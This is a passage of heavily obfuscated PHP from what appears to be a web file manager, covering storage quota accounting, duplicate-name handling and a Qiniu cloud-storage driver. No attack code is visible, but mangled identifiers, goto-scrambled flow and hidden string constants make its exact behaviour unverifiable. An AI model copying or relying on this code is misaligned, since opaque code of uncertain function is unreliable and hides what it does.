a®Ø¦×Š÷; Aæğ¸ø”Ü: CacheLock::lock($AèÏÇŞöƒ£, 20); $this->sourceCacheClear($FÎ–Ñ¢ôÙ); $CÉ‚·¡â… = $this->sourceInfo($FÎ–Ñ¢ôÙ); goto d‡„ã¬Æï; bâğ¿ÙÏá: $DñËç¹Û½ = $Fæ–Ô‰ÊŠ - intval($CÉ‚·¡â…[$eÆ©ÒÆ…˜å[77]]); if ($DñËç¹Û½ == 0) { return CacheLock::unlock($AèÏÇŞöƒ£); } $this->where(array($eÆ©ÒÆ…˜å[383] => $FÎ–Ñ¢ôÙ))->setField($eÆ©ÒÆ…˜å[77], $Fæ–Ô‰ÊŠ); goto B˜«ÀÙÜä†; f†Î‡Œ—ó: CacheLock::unlock($AèÏÇŞöƒ£); goto Eø‘™™¾Ã; B˜«ÀÙÜä†: $DÜ–ÅÖñ•é = $this->parentLevelArray($CÉ‚·¡â…[$eÆ©ÒÆ…˜å[459]]); if ($DÜ–ÅÖñ•é) { $eøæ¯¡­— = array($eÆ©ÒÆ…˜å[369] => array($eÆ©ÒÆ…˜å[384], $DÜ–ÅÖñ•é)); if ($DñËç¹Û½ < 0) { $eøæ¯¡­—[$eÆ©ÒÆ…˜å[77]] = array($eÆ©ÒÆ…˜å[922], abs($DñËç¹Û½)); } $this->where($eøæ¯¡­—)->setAdd($eÆ©ÒÆ…˜å[77], $DñËç¹Û½); } $this->targetSpaceUpdate($CÉ‚·¡â…[$eÆ©ÒÆ…˜å[371]], $CÉ‚·¡â…[$eÆ©ÒÆ…˜å[456]]); goto f†Î‡Œ—ó; d‡„ã¬Æï: $eøæ¯¡­— = array($eÆ©ÒÆ…˜å[368] => $FÎ–Ñ¢ôÙ, $eÆ©ÒÆ…˜å[396] => 0); $Fæ–Ô‰ÊŠ = $this->where($eøæ¯¡­—)->sum($eÆ©ÒÆ…˜å[77]); $Fæ–Ô‰ÊŠ = intval($Fæ–Ô‰ÊŠ); goto bâğ¿ÙÏá; a®Ø¦×Š÷: $eÆ©ÒÆ…˜å =& $_SERVER[Î¿—”òá]; if ($this->statusIgnoreResetSpace) { return; } $AèÏÇŞöƒ£ = $eÆ©ÒÆ…˜å[2351] . $FÎ–Ñ¢ôÙ; goto Aæğ¸ø”Ü; Eø‘™™¾Ã: } public function folderSizeResetChildren($AÇîÆÅ‰ñÜ) { goto FÅ…äĞ– à; A¿«¬Ô¡: $f©ä»Êˆé = array($e¸ê¢×í‚„[518] => 1, $e¸ê¢×í‚„[525] => array($e¸ê¢×í‚„[483], $f¾‚Âš—ó[$e¸ê¢×í‚„[459]] . $AÇîÆÅ‰ñÜ . $e¸ê¢×í‚„[484])); $Dµ…”×§’Í = $e¸ê¢×í‚„[2352]; $C¼İñËŠº = $this->field($Dµ…”×§’Í)->where($f©ä»Êˆé)->select(); goto b…õâ¯ÕÜ‘; b…õâ¯ÕÜ‘: $f©ä»Êˆé[$e¸ê¢×í‚„[370]] = 0; $FŠŸ¤†Ä¦ = $this->field($Dµ…”×§’Í)->where($f©ä»Êˆé)->select(); if (!$FŠŸ¤†Ä¦) { return; } goto dŒÔÒ¿´Œ; dŒÔÒ¿´Œ: $C¼İñËŠº[] = $f¾‚Âš—ó; $C¼İñËŠº = array_to_keyvalue($C¼İñËŠº, $e¸ê¢×í‚„[369]); foreach ($C¼İñËŠº as $B‹„ùŒäÍ„ => $døšó¢„µÍ) { $C¼İñËŠº[$B‹„ùŒäÍ„][$e¸ê¢×í‚„[2353]] = $C¼İñËŠº[$B‹„ùŒäÍ„][$e¸ê¢×í‚„[77]]; $C¼İñËŠº[$B‹„ùŒäÍ„][$e¸ê¢×í‚„[77]] = 0; } goto dÌÉÊ‚‹ŒÓ; FÅ…äĞ– à: $e¸ê¢×í‚„ =& $_SERVER[Î¿—”òá]; $this->sourceCacheClear($AÇîÆÅ‰ñÜ); $f¾‚Âš—ó = $this->sourceInfo($AÇîÆÅ‰ñÜ); goto A¿«¬Ô¡; dÌÉÊ‚‹ŒÓ: foreach ($FŠŸ¤†Ä¦ as $døšó¢„µÍ) { $fÎ·†ÒÒêŸ = $døšó¢„µÍ[$e¸ê¢×í‚„[461]] . $e¸ê¢×í‚„[33]; if (!isset($C¼İñËŠº[$fÎ·†ÒÒêŸ])) { continue; } if ($døšó¢„µÍ[$e¸ê¢×í‚„[397]] == $C¼İñËŠº[$fÎ·†ÒÒêŸ][$e¸ê¢×í‚„[397]]) { $C¼İñËŠº[$fÎ·†ÒÒêŸ][$e¸ê¢×í‚„[77]] += $døšó¢„µÍ[$e¸ê¢×í‚„[77]]; } } foreach ($C¼İñËŠº as $døšó¢„µÍ) { $d™¹ÏƒÂ¾‰ = $this->parentLevelArray($døšó¢„µÍ[$e¸ê¢×í‚„[459]]); foreach ($d™¹ÏƒÂ¾‰ as $fÎ·†ÒÒêŸ) { $fÎ·†ÒÒêŸ = $fÎ·†ÒÒêŸ . $e¸ê¢×í‚„[33]; if (!isset($C¼İñËŠº[$fÎ·†ÒÒêŸ])) { continue; } if ($døšó¢„µÍ[$e¸ê¢×í‚„[397]] == $C¼İñËŠº[$fÎ·†ÒÒêŸ][$e¸ê¢×í‚„[397]]) { $C¼İñËŠº[$fÎ·†ÒÒêŸ][$e¸ê¢×í‚„[77]] += $døšó¢„µÍ[$e¸ê¢×í‚„[77]]; } } } $Dë¿‡á¶á· = array(); goto DìµÂ³«ñè; DìµÂ³«ñè: foreach ($C¼İñËŠº as $døšó¢„µÍ) { if ($døšó¢„µÍ[$e¸ê¢×í‚„[77]] == $døšó¢„µÍ[$e¸ê¢×í‚„[2353]]) { continue; } $Dë¿‡á¶á·[] = array($e¸ê¢×í‚„[369], $døšó¢„µÍ[$e¸ê¢×í‚„[369]], $e¸ê¢×í‚„[77], $døšó¢„µÍ[$e¸ê¢×í‚„[77]]); } $this->saveAll($Dë¿‡á¶á·); goto BÖ¶œ—ê‘; BÖ¶œ—ê‘: } public function userSpaceReset($f²Øğ‹Ğ¤¬ = false) { $CÄ¸¡Ü±ÒŒ =& $_SERVER[Î¿—”òá]; $BÉÇ±ªË™ = $this->where(array($CÄ¸¡Ü±ÒŒ[371] => self::TYPE_USER, $CÄ¸¡Ü±ÒŒ[456] => $f²Øğ‹Ğ¤¬, $CÄ¸¡Ü±ÒŒ[370] => 0))->sum($CÄ¸¡Ü±ÒŒ[77]); Model($CÄ¸¡Ü±ÒŒ[474])->userEdit($f²Øğ‹Ğ¤¬, array($CÄ¸¡Ü±ÒŒ[2083] => $BÉÇ±ªË™)); } public function targetSpaceUpdate($cï‰„À‰¯, $eÂ‚”§‡áê) { $cƒ«‹‡‹¶” =& $_SERVER[Î¿—”òá]; if (!$eÂ‚”§‡áê) { return; } if (!in_array($cï‰„À‰¯, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $C‰ä¿³Ïšõ = $this->targetSpaceSize($cï‰„À‰¯, $eÂ‚”§‡áê); if ($cï‰„À‰¯ == self::TYPE_USER) { Model($cƒ«‹‡‹¶”[474])->userEdit($eÂ‚”§‡áê, array($cƒ«‹‡‹¶”[2083] => $C‰ä¿³Ïšõ)); } else { if ($cï‰„À‰¯ == self::TYPE_GROUP) { Model($cƒ«‹‡‹¶”[458])->groupEdit($eÂ‚”§‡áê, array($cƒ«‹‡‹¶”[2083] => $C‰ä¿³Ïšõ)); } } } public function targetSpaceSize($D—³×™‹Ù, $A‚ÉÛÕÃ½) { goto c¹„¾¸âÉÜ; c¹„¾¸âÉÜ: $Cä”«¡Ï‘Š =& $_SERVER[Î¿—”òá]; $aÉİùá„Ú½ = $this->sourceRoot($D—³×™‹Ù, $A‚ÉÛÕÃ½, !0); if (!$aÉİùá„Ú½) { return 0; } goto AÒÄ‰‰ÌÛÎ; e¤ïÜìïê: $Dê˜æéÏ‘à = array_to_keyvalue($Dê˜æéÏ‘à, $Cä”«¡Ï‘Š[33], $Cä”«¡Ï‘Š[369]); $Dê˜æéÏ‘à = array_unique(array_filter($Dê˜æéÏ‘à)); if ($Dê˜æéÏ‘à) { $f­ìĞÁŒê‚ = array($Cä”«¡Ï‘Š[383] => array($Cä”«¡Ï‘Š[384], $Dê˜æéÏ‘à)); $eè §Á¶Œ += floatval($this->where($f­ìĞÁŒê‚)->sum($Cä”«¡Ï‘Š[77])); } goto cšùÉÆ°•; AÒÄ‰‰ÌÛÎ: $eè §Á¶Œ = floatval($aÉİùá„Ú½[$Cä”«¡Ï‘Š[77]]); $f­ìĞÁŒê‚ = array($Cä”«¡Ï‘Š[525] => array($Cä”«¡Ï‘Š[483], $Cä”«¡Ï‘Š[470] . $aÉİùá„Ú½[$Cä”«¡Ï‘Š[369]] . $Cä”«¡Ï‘Š[484])); $Dê˜æéÏ‘à = Model($Cä”«¡Ï‘Š[395])->field($Cä”«¡Ï‘Š[383])->where($f­ìĞÁŒê‚)->select(); goto e¤ïÜìïê; cšùÉÆ°•: return $eè §Á¶Œ; goto cÁÎ…ÌçõŸ; cÁÎ…ÌçõŸ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Eöœ—Œ±Şš) { return $this->fileTypeProfile($Eöœ—Œ±Şš, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Aó³Ïˆ–«) { return $this->fileTypeProfile($Aó³Ïˆ–«, SourceModel::TYPE_GROUP); } private function fileTypeProfile($a™ŸÓµÈÅ, $dšñíŠò¤—) { goto d°œŠ™àöâ; bÆÏ«º’Ã: foreach ($e¤Ë¡ÓÊÉÛ as $D½À¼ŸŞÇ• => $D·“ªÂƒŞô) { $cÍôùÎšİ¾[$d©©äÀ‰Õ[372]] = $this->fileTypeWhere($D½À¼ŸŞÇ•); $a²åœçÒõ[$D½À¼ŸŞÇ•] = array($d©©äÀ‰Õ[2356] => $D·“ªÂƒŞô[$d©©äÀ‰Õ[28]], $d©©äÀ‰Õ[2357] => $this->where($cÍôùÎšİ¾)->count(), $d©©äÀ‰Õ[520] => $this->where($cÍôùÎšİ¾)->sum($d©©äÀ‰Õ[77])); } Cache::set($d¦ã…œõœ¿, $a²åœçÒõ, 1200); return $a²åœçÒõ; goto f¤‰£õõÖµ; a§´‘»Á: if ($Eîã÷»ÂÎ) { return $Eîã÷»ÂÎ; } $cÍôùÎšİ¾ = array($d©©äÀ‰Õ[518] => 0); if ($a™ŸÓµÈÅ != !1) { $cÍôùÎšİ¾[$d©©äÀ‰Õ[456]] = $a™ŸÓµÈÅ; $cÍôùÎšİ¾[$d©©äÀ‰Õ[371]] = $dšñíŠò¤—; } goto D¡ìÀ»Óíƒ; d°œŠ™àöâ: $d©©äÀ‰Õ =& $_SERVER[Î¿—”òá]; $d¦ã…œõœ¿ = $d©©äÀ‰Õ[2354] . $a™ŸÓµÈÅ . $d©©äÀ‰Õ[70] . $dšñíŠò¤—; $Eîã÷»ÂÎ = Cache::get($d¦ã…œõœ¿); goto a§´‘»Á; D¡ìÀ»Óíƒ: $a²åœçÒõ = array(); $a²åœçÒõ[$d©©äÀ‰Õ[2355]] = array($d©©äÀ‰Õ[2356] => LNG($d©©äÀ‰Õ[2355]), $d©©äÀ‰Õ[2357] => $this->where($cÍôùÎšİ¾)->count(), $d©©äÀ‰Õ[520] => $this->where($cÍôùÎšİ¾)->sum($d©©äÀ‰Õ[77])); $e¤Ë¡ÓÊÉÛ = KodIO::fileTypeList(); goto bÆÏ«º’Ã; f¤‰£õõÖµ: } public function fileNameExist($B¼¹ôÀ±®, $F÷ôË‹†…ô) { $AÕº«öÚø® =& $_SERVER[Î¿—”òá]; $D™øÎÄá = $this->childList($B¼¹ôÀ±®); foreach ($D™øÎÄá as $dîº°®Âø®) { if ($dîº°®Âø®[$AÕº«öÚø®[28]] == $F÷ôË‹†…ô) { return $dîº°®Âø®[$AÕº«öÚø®[369]]; } } return !1; } public function childList($AğŠÑÊ‹³) { goto AŸ¿¤ñˆå¤; AŸ¿¤ñˆå¤: $Cƒ§êì­öî =& $_SERVER[Î¿—”òá]; $aë¯ö…Šô = $Cƒ§êì­öî[2335] . $AğŠÑÊ‹³; if (isset(self::$cacheChildList[$aë¯ö…Šô])) { return self::$cacheChildList[$aë¯ö…Šô]; } goto a”¾²»´Æ‚; C‚”‹¤¯Ÿº: self::$cacheChildList[$aë¯ö…Šô] = $f…ñËƒ·º; foreach ($f…ñËƒ·º as $D‘‹íŒ„÷ë) { $aë¯ö…Šô = $Cƒ§êì­öî[410] . $D‘‹íŒ„÷ë[$Cƒ§êì­öî[369]]; self::$cacheSourceInfo[$aë¯ö…Šô] = $D‘‹íŒ„÷ë; } return $f…ñËƒ·º; goto FÃ¨²‰ Û; a”¾²»´Æ‚: $döªÁÁ‡Ï¼ = array($Cƒ§êì­öî[461] => intval($AğŠÑÊ‹³), $Cƒ§êì­öî[397] => 0); $f…ñËƒ·º = $this->where($döªÁÁ‡Ï¼)->select(); $f…ñËƒ·º = $f…ñËƒ·º ? $f…ñËƒ·º : array(); goto C‚”‹¤¯Ÿº; FÃ¨²‰ Û: } public function fileNameAuto($b¦÷¦ˆìñÍ, $AŠ§í‘„á, $EÕÈË˜áÎ = REPEAT_RENAME, $B‚Œíˆ• = false) { $Cø—²™÷Ÿ =& $_SERVER[Î¿—”òá]; $BÏŸÍÇå¹ = $this->childList($b¦÷¦ˆìñÍ); $DµÄ¹„¨¿ = array_to_keyvalue($BÏŸÍÇå¹, $Cø—²™÷Ÿ[33], $Cø—²™÷Ÿ[28]); return $this->fileNameAutoGet($DµÄ¹„¨¿, $AŠ§í‘„á, $EÕÈË˜áÎ, $B‚Œíˆ•); } public function fileNameAutoGet($a‚®„Òğ„, $FÇ¼µÎ’Ç×, $aÂ¯ô¤Õ¯à, $fâÂ¶Ñ‚£¯) { $CÕÔÕŒĞ¨— =& $_SERVER[Î¿—”òá]; if ($aÂ¯ô¤Õ¯à == REPEAT_REPLACE || !$a‚®„Òğ„ || !in_array_not_case($FÇ¼µÎ’Ç×, $a‚®„Òğ„) || $fâÂ¶Ñ‚£¯ && $aÂ¯ô¤Õ¯à != REPEAT_RENAME_FOLDER) { return $FÇ¼µÎ’Ç×; } if ($aÂ¯ô¤Õ¯à == REPEAT_SKIP) { return !1; } $F¸™Ù—íà = $CÕÔÕŒĞ¨—[91] . get_path_ext($FÇ¼µÎ’Ç×); $F¸™Ù—íà = $F¸™Ù—íà == $CÕÔÕŒĞ¨—[91] || $fâÂ¶Ñ‚£¯ ? $CÕÔÕŒĞ¨—[33] : $F¸™Ù—íà; for ($B”æÁ¸ïôÂ = 1; $B”æÁ¸ïôÂ <= count($a‚®„Òğ„) + 1; $B”æÁ¸ïôÂ++) { $bÓ–Üí•ùå = substr($FÇ¼µÎ’Ç×, 0, strlen($FÇ¼µÎ’Ç×) - strlen($F¸™Ù—íà)); $Cö“ŸÉó®´ = $bÓ–Üí•ùå . "\50{$B”æÁ¸ïôÂ}\51{$F¸™Ù—íà}"; if (!in_array_not_case($Cö“ŸÉó®´, $a‚®„Òğ„)) { return $Cö“ŸÉó®´; } } } } goto bö¢¼×â²; DÖ¨¾İ‘‰Ø: register_shutdown_function($_SERVER[‡•˜°©ˆ][36]); set_error_handler($_SERVER[‡•˜°©ˆ][49], $C°‹Ö‚çá‘); if (function_exists($_SERVER[‡•˜°©ˆ][50])) { set_exception_handler($_SERVER[‡•˜°©ˆ][51]); } goto E–âá¯òÔ; F¥ø·¤¨È•: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($Cõ—Ù ˆ µ) { parent::__construct(); require_once SDK_DIR . $_SERVER[Î¿—”òá][1205]; $this->_init($Cõ—Ù ˆ µ); } public function _init($a‡ó­İ†Ñ„) { foreach ($a‡ó­İ†Ñ„ as $bì»ìÓ±‰ç => $DÏÕ½ÔÎ£È) { if (isset($this->{$bì»ìÓ±‰ç})) { $this->{$bì»ìÓ±‰ç} = $DÏÕ½ÔÎ£È; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Î¿—”òá][1206], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($BÒÃÇŒÚ®, $C ÅìïŞ–Ö = '', $aëŸ‘Š×à = REPEAT_RENAME) { if ($this->setContent($BÒÃÇŒÚ®, $C ÅìïŞ–Ö)) { return $this->getPathOuter($BÒÃÇŒÚ®); } return !1; } public function mkdir($fè‘‡¼Î—Ò, $bÈ»õ¹…° = REPEAT_SKIP) { goto f»¿”î‡©®; eä ùƒ›åÁ: if (!$this->mkfile($aÒ¦±ò¾ôº)) { return !1; } if (!$this->moveFile($aÒ¦±ò¾ôº, $fè‘‡¼Î—Ò)) { $this->delFile($aÒ¦±ò¾ôº); return !1; } return $this->getPathOuter($FÅ…‚åÈ¬æ); goto eƒĞ¥‘î±Š; AÜÔÂà²‹—: $fè‘‡¼Î—Ò = $FÅ…‚åÈ¬æ . $F¥—Úğ¯éƒ[8]; $bï¨ÙÁ×¾ = get_path_this($FÅ…‚åÈ¬æ); $aÒ¦±ò¾ôº = $fè‘‡¼Î—Ò . $bï¨ÙÁ×¾; goto eä ùƒ›åÁ; f»¿”î‡©®: $F¥—Úğ¯éƒ =& $_SERVER[Î¿—”òá]; $FÅ…‚åÈ¬æ = trim($fè‘‡¼Î—Ò, $F¥—Úğ¯éƒ[8]); if ($this->_isFolder($FÅ…‚åÈ¬æ)) { return $this->getPathOuter($FÅ…‚åÈ¬æ); } goto AÜÔÂà²‹—; eƒĞ¥‘î±Š: } public function copyFile($AÇ¡‰ Ş¥Æ, $f‡ÅÙ‰Ğå„) { $aä¨ÙÜÇœ” = $this->bucketManager->copy($this->bucket, $AÇ¡‰ Ş¥Æ, $this->bucket, $f‡ÅÙ‰Ğå„, !0); return $aä¨ÙÜÇœ” ? !1 : $this->getPathOuter($f‡ÅÙ‰Ğå„); } public function moveFile($D¯Ô×”ß—, $Fİ„ÓµŸ§ƒ) { $B ÍåĞø•ƒ = $this->bucketManager->move($this->bucket, $D¯Ô×”ß—, $this->bucket, $Fİ„ÓµŸ§ƒ, !0); return $B ÍåĞø•ƒ ? !1 : $this->getPathOuter($Fİ„ÓµŸ§ƒ); } public function delFile($BÂË‰é­) { $C”¥íäÜ¼Ô = $this->bucketManager->delete($this->bucket, $BÂË‰é­); return $C”¥íäÜ¼Ô ? !1 : !0; } public function delFolder($C˜äâ Ğ²) { $BĞÍ¢ƒŠÇÁ = $this->fileList($C˜äâ Ğ²); if (empty($BĞÍ¢ƒŠÇÁ)) { return !0; } $d¿±æîº”è = 1000; if (count($BĞÍ¢ƒŠÇÁ) <= $d¿±æîº”è) { return $this->qnDelObj($BĞÍ¢ƒŠÇÁ) ? !1 : !0; } foreach (array_chunk($BĞÍ¢ƒŠÇÁ, $d¿±æîº”è) as $A•ôÏ¬àÈ‹) { $e·á“Øøæ = $this->qnDelObj($A•ôÏ¬àÈ‹); if ($e·á“Øøæ) { return !1; } } return !0; } private function qnDelObj($a¨Øöİ¹˜) { $AğÙÊé®Ãˆ = $this->bucketManager->buildBatchDelete($this->bucket, $a¨Øöİ¹˜); list($Aß¾ÔÂ£à, $cù³Äœì¹) = $this->bucketManager->batch($AğÙÊé®Ãˆ); return $cù³Äœì¹; } private function fileList($fĞÒŒÁå¤­, $Dåè„ì¡¶ã = 0) { goto fÆŠ”ì¥ó; BäªªÔÈìÍ: $eîğ¢ƒŠ²Ä = array(); while (!0) { list($e¨Èæ£Éå†, $FÒ¤©±—Š) = $this->bucketManager->listFiles($this->bucket, $A¤¥É•ŒÚ…, $bÙ¢Éõù , $Cßëöà‰¯Ù, $c‹³ó²Ì²ô); if ($FÒ¤©±—Š) { return !1; } $bÙ¢Éõù  = array_key_exists($b¼–³ÌÀß“[1176], $e¨Èæ£Éå†) ? $bÙ¢Éõù  = $e¨Èæ£Éå†[$b¼–³ÌÀß“[1207]] : $b¼–³ÌÀß“[33]; foreach ($e¨Èæ£Éå†[$b¼–³ÌÀß“[1208]] as $FêÄöÖ‹øø) { $aÏ‡Ó‘…š­ = $FêÄöÖ‹øø[$b¼–³ÌÀß“[89]]; if ($Dåè„ì¡¶ã) { $aÏ‡Ó‘…š­ = array($b¼–³ÌÀß“[28] => $aÏ‡Ó‘…š­, $b¼–³ÌÀß“[77] => $FêÄöÖ‹øø[$b¼–³ÌÀß“[1209]]); } $eîğ¢ƒŠ²Ä[] = $aÏ‡Ó‘…š­; } if ($bÙ¢Éõù  == $b¼–³ÌÀß“[33]) { break; } } return $eîğ¢ƒŠ²Ä; goto dá‘ã™ĞÂ; fÆŠ”ì¥ó: $b¼–³ÌÀß“ =& $_SERVER[Î¿—”òá]; $fĞÒŒÁå¤­ = trim($fĞÒŒÁå¤­, $b¼–³ÌÀß“[8]); $A¤¥É•ŒÚ… = empty($fĞÒŒÁå¤­) ? $b¼–³ÌÀß“[33] : $fĞÒŒÁå¤­ . $b¼–³ÌÀß“[8]; goto câÇ­Ô…„; câÇ­Ô…„: $bÙ¢Éõù  = $b¼–³ÌÀß“[33]; $Cßëöà‰¯Ù = 1000; $c‹³ó²Ì²ô = $b¼–³ÌÀß“[33]; goto BäªªÔÈìÍ; dá‘ã™ĞÂ: } public function rename($E¤µ„†òÕ, $bç˜êÅ¬í) { return $this->renameObject($E¤µ„†òÕ, $bç˜êÅ¬í); } public function fileInfo($f™È¸¯×óÔ, $A»’ ŞÀ = false, $b´ÂÑİÖõÃ = array()) { goto d‡øÅ½ƒÅ¸; dî¦èÒŒºÂ: return $d©µ™‘‹øš; goto bå§µš«; d‡øÅ½ƒÅ¸: $Dùö©³ŠãÓ =& $_SERVER[Î¿—”òá]; if ($A»’ ŞÀ) { return array($Dùö©³ŠãÓ[28] => $this->pathThis($f™È¸¯×óÔ), $Dùö©³ŠãÓ[75] => $this->getPathOuter($Dùö©³ŠãÓ[8] . $f™È¸¯×óÔ), $Dùö©³ŠãÓ[29] => $Dùö©³ŠãÓ[167], $Dùö©³ŠãÓ[77] => isset($b´ÂÑİÖõÃ[$Dùö©³ŠãÓ[1209]]) ? $b´ÂÑİÖõÃ[$Dùö©³ŠãÓ[1209]] : 0, $Dùö©³ŠãÓ[160] => $this->ext($f™È¸¯×óÔ)); } $d©µ™‘‹øš = array($Dùö©³ŠãÓ[28] => $this->pathThis($f™È¸¯×óÔ), $Dùö©³ŠãÓ[75] => $this->getPathOuter($Dùö©³ŠãÓ[8] . $f™È¸¯×óÔ), $Dùö©³ŠãÓ[29] => $Dùö©³ŠãÓ[167], $Dùö©³ŠãÓ[187] => 0, $Dùö©³ŠãÓ[107] => 0, $Dùö©³ŠãÓ[77] => 0, $Dùö©³ŠãÓ[160] => $this->ext($f™È¸¯×óÔ), $Dùö©³ŠãÓ[188] => !0, $Dùö©³ŠãÓ[189] => !0); goto C¿ğĞ—Éôî; C¿ğĞ—Éôî: if (empty($b´ÂÑİÖõÃ)) { $b´ÂÑİÖõÃ = $this->objectMeta($f™È¸¯×óÔ); if (!$b´ÂÑİÖõÃ) { return $d©µ™‘‹øš; } } if (isset($b´ÂÑİÖõÃ[$Dùö©³ŠãÓ[1210]])) { $d©µ™‘‹øš[$Dùö©³ŠãÓ[107]] = substr($b´ÂÑİÖõÃ[$Dùö©³ŠãÓ[1210]] . $Dùö©³ŠãÓ[33], 0, 10); } if (isset($b´ÂÑİÖõÃ[$Dùö©³ŠãÓ[1209]])) { $d©µ™‘‹øš[$Dùö©³ŠãÓ[77]] = $b´ÂÑİÖõÃ[$Dùö©³ŠãÓ[1209]]; } goto dî¦èÒŒºÂ; bå§µš«: } public function folderInfo($E…¦±–Ü‹å, $AÓ— øù = false) { goto AˆÍŠö²†Õ; AˆÍŠö²†Õ: $fîôÑ®ÎƒÜ =& $_SERVER[Î¿—”òá]; if ($AÓ— øù) { return array($fîôÑ®ÎƒÜ[28] => $this->pathThis($E…¦±–Ü‹å), $fîôÑ®ÎƒÜ[75] => $this->getPathOuter($fîôÑ®ÎƒÜ[8] . $E…¦±–Ü‹å), $fîôÑ®ÎƒÜ[29] => $fîôÑ®ÎƒÜ[76]); } $f´ìÅ—‡êÎ = array($fîôÑ®ÎƒÜ[28] => $this->pathThis($E…¦±–Ü‹å), $fîôÑ®ÎƒÜ[75] => $this->getPathOuter($fîôÑ®ÎƒÜ[8] . $E…¦±–Ü‹å), $fîôÑ®ÎƒÜ[29] => $fîôÑ®ÎƒÜ[76], $fîôÑ®ÎƒÜ[187] => 0, $fîôÑ®ÎƒÜ[107] => 0, $fîôÑ®ÎƒÜ[1155] => !0, $fîôÑ®ÎƒÜ[1156] => !0); goto d•Ä©ĞÎ; AêÍå­°è”: return $f´ìÅ—‡êÎ; goto F»Ì’‰÷¼…; d•Ä©ĞÎ: $E…¦±–Ü‹å = rtrim($E…¦±–Ü‹å, $fîôÑ®ÎƒÜ[8]) . $fîôÑ®ÎƒÜ[8]; $FËƒ‡Ÿã‹ = $this->objectMeta($E…¦±–Ü‹å); if (isset($FËƒ‡Ÿã‹[$fîôÑ®ÎƒÜ[1210]])) { $f´ìÅ—‡êÎ[$fîôÑ®ÎƒÜ[107]] = substr($FËƒ‡Ÿã‹[$fîôÑ®ÎƒÜ[1210]] . $fîôÑ®ÎƒÜ[33], 0, 10); } goto AêÍå­°è”; F»Ì’‰÷¼…: } public function listPath($b¶Íù¡œ—, $A“òÛÙ¬± = false) { goto c¼ŞÒæ†˜Ö; b¬ôÄŒ‘‹ø: $d†íæêÑÔ = $aÄÚ’àğ = array(); while (!0) { list($cì¤ÃË™È, $FãÌèÇéö¦) = $this->bucketManager->listFiles($this->bucket, $dÎ·î¥¦–, $aé£˜¶‚…Ü, $dàÇ§‰ÏæÔ, $d—õí—ƒÛª); if ($FãÌèÇéö¦) { return !1; } $aé£˜¶‚…Ü = array_key_exists($C­ê‹İïÏä[1176], $cì¤ÃË™È) ? $aé£˜¶‚…Ü = $cì¤ÃË™È[$C­ê‹İïÏä[1207]] : $C­ê‹İïÏä[33]; if (isset($cì¤ÃË™È[$C­ê‹İïÏä[1211]])) { foreach ($cì¤ÃË™È[$C­ê‹İïÏä[1211]] as $AŒì«œ×²«) { if ($AŒì«œ×²« == $dÎ·î¥¦–) { continue; } $d†íæêÑÔ[] = $this->folderInfo($AŒì«œ×²«, $A“òÛÙ¬±); } } if (isset($cì¤ÃË™È[$C­ê‹İïÏä[1208]])) { foreach ($cì¤ÃË™È[$C­ê‹İïÏä[1208]] as $A²Š’°¹Éƒ) { if ($A²Š’°¹Éƒ[$C­ê‹İïÏä[89]] == $dÎ·î¥¦–) { continue; } $aÄÚ’àğ[] = $this->fileInfo($A²Š’°¹Éƒ[$C­ê‹İïÏä[89]], $A“òÛÙ¬±, $A²Š’°¹Éƒ); } } if ($aé£˜¶‚…Ü == $C­ê‹İïÏä[33]) { break; } } return array($C­ê‹İïÏä[74] => $d†íæêÑÔ, $C­ê‹İïÏä[73] => $aÄÚ’àğ); goto d›ãƒ³–ù; c¼ŞÒæ†˜Ö: $C­ê‹İïÏä =& $_SERVER[Î¿—”òá]; $b¶Íù¡œ— = trim($b¶Íù¡œ—, $C­ê‹İïÏä[8]); $dÎ·î¥¦– = empty($b¶Íù¡œ—) ? $C­ê‹İïÏä[33] : $b¶Íù¡œ— . $C­ê‹İïÏä[8]; goto A•îîŸĞµğ; A•îîŸĞµğ: $aé£˜¶‚…Ü = $C­ê‹İïÏä[33]; $dàÇ§‰ÏæÔ = 1000; $d—õí—ƒÛª = $C­ê‹İïÏä[8]; goto b¬ôÄŒ‘‹ø; d›ãƒ³–ù: } public function has($còèËÂ¬öº, $f£šÒ‹Ô”® = false, $D¡ƒ¶Õ—œ = true) { goto cò‚É°á•…; EÀÕ‡¿¡‚Œ: $DèšÄÓ‹¯š = $Eî§ÁÄñ[33]; $d¶¤Ş‡ï¼ = 1000; $dÚ™¦²õµç = $Eî§ÁÄñ[8]; goto bçÌŸ›´Œ©; cò‚É°á•…: $Eî§ÁÄñ =& $_SERVER[Î¿—”òá]; $còèËÂ¬öº = trim($còèËÂ¬öº, $Eî§ÁÄñ[8]); $CÀñŠÖ•‘“ = empty($còèËÂ¬öº) ? $Eî§ÁÄñ[33] : $còèËÂ¬öº . $Eî§ÁÄñ[8]; goto EÀÕ‡¿¡‚Œ; f¯õÑ™ÍÒğ: if ($f£šÒ‹Ô”®) { return array($Eî§ÁÄñ[191] => $b­à Ùæ«, $Eî§ÁÄñ[192] => $f¤£”ª©‹); } return !1; goto EÀçéÏ…š³; bçÌŸ›´Œ©: $b­à Ùæ« = 0; $f¤£”ª©‹ = 0; while (!0) { list($D‹‰ì‰‹Š¹, $dµ»™ŠĞƒ³) = $this->bucketManager->listFiles($this->bucket, $CÀñŠÖ•‘“, $DèšÄÓ‹¯š, $d¶¤Ş‡ï¼, $dÚ™¦²õµç); if ($dµ»™ŠĞƒ³) { return !1; } $DèšÄÓ‹¯š = array_key_exists($Eî§ÁÄñ[1176], $D‹‰ì‰‹Š¹) ? $DèšÄÓ‹¯š = $D‹‰ì‰‹Š¹[$Eî§ÁÄñ[1207]] : $Eî§ÁÄñ[33]; if ($f£šÒ‹Ô”®) { if (!empty($D‹‰ì‰‹Š¹[$Eî§ÁÄñ[1208]])) { $b­à Ùæ« += count($D‹‰ì‰‹Š¹[$Eî§ÁÄñ[1208]]); } if 